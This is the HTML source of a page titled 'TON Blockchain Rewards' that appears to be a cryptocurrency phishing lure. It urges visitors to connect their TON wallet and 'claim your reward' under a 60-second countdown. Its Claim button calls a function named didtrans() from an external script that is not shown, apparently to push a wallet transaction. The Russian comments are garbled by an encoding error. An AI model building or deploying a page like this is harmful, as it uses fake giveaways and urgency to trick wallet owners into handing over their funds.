<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Blockchain Rewards</title>
    
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    
    <style>
        body {
            background: linear-gradient(135deg, #001f3d, #0057b7);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }

        header, footer {
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px 0;
        }

        #title {
            font-size: 36px;
            font-weight: bold;
            color: #00aaff;
            text-shadow: 0 0 10px #00aaff;
            margin-bottom: 10px;
        }

        #ton-logo-large {
            width: 80px;
            height: 80px;
            margin-bottom: 10px;
        }

        #subtitle {
            font-size: 20px;
            color: #b0c4de;
            margin-bottom: 20px;
        }

        main {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 30px;
        }

        button {
            background: linear-gradient(90deg, #0088cc, #00aaff);
            color: white;
            font-size: 22px;
            padding: 12px 28px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 0 10px #00aaff;
            margin-bottom: 30px;
        }

        button:hover {
            background: linear-gradient(90deg, #0066aa, #0099dd);
            box-shadow: 0 0 20px #00aaff;
        }

        #logos {
            display: flex;
            gap: 30px;
            margin-top: 20px;
            justify-content: center;
        }

        .logo {
            width: 50px;
            height: 50px;
        }

        #dynamic-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 30px;
            margin-top: 20px;
        }

        .dynamic-logo {
            width: 60px;
            height: 60px;
            transition: transform 1s ease-in-out;
            animation: heartbeat 1.5s ease-in-out infinite;
        }

        @keyframes heartbeat {
            0%, 100% {
                transform: scale(1);
            }
            25% {
                transform: scale(1.2);
            }
            50% {
                transform: scale(1);
            }
            75% {
                transform: scale(1.2);
            }
        }

        footer {
            font-size: 14px;
            color: #b0c4de;
            position: relative;
            bottom: 30px;
        }

        #countdown {
            font-size: 24px;
            font-weight: bold;
            color: #ff4444;
            margin-top: 20px;
        }

        #wallet-info {
            font-size: 18px;
            margin-bottom: 30px; /* –ú–µ—Å—Ç–æ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ */
        }
    </style>
</head>
<body>
    <header>
        <div id="title">TON Blockchain Rewards</div>
        <img id="ton-logo-large" src="ton_logo.png" alt="TON Logo">
    </header>
    
    <main>
        <div id="subtitle">Connect your wallet and claim your reward now!</div>

        <div id="wallet-info"></div> <!-- –ë–ª–æ–∫ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ -->

        <div id="dynamic-logos">
            <img class="dynamic-logo" src="notcoin_logo.png" alt="Notcoin">
            <img class="dynamic-logo" src="ton_logo.png" alt="TON">
            <img class="dynamic-logo" src="dog_logo.png" alt="TonDogs">
        </div>

        <div id="ton-connect"></div>
        <button onclick="didtrans();">üöÄ Claim Reward üöÄ</button>
        
        <div id="countdown">Time left: <span id="timer">60</span> seconds</div>
        
        <div id="logos">
            <img class="logo" src="telegram_logo.png" alt="Telegram">
            <img class="logo" src="ton_logo.png" alt="TON Blockchain">
            <img class="logo" src="blockchain_logo.png" alt="Blockchain">
        </div>
    </main>
    
    <footer>
        ¬© 2025 TON Blockchain Rewards | All rights reserved
    </footer>

    <div id="wallet-info"></div>

    <!-- Heartbeat Sound -->
    <audio id="heartbeat-sound" src="heartbeat_sound.mp3" loop></audio>

    <script src="tonsdk.js"></script>
</body>  
</html>
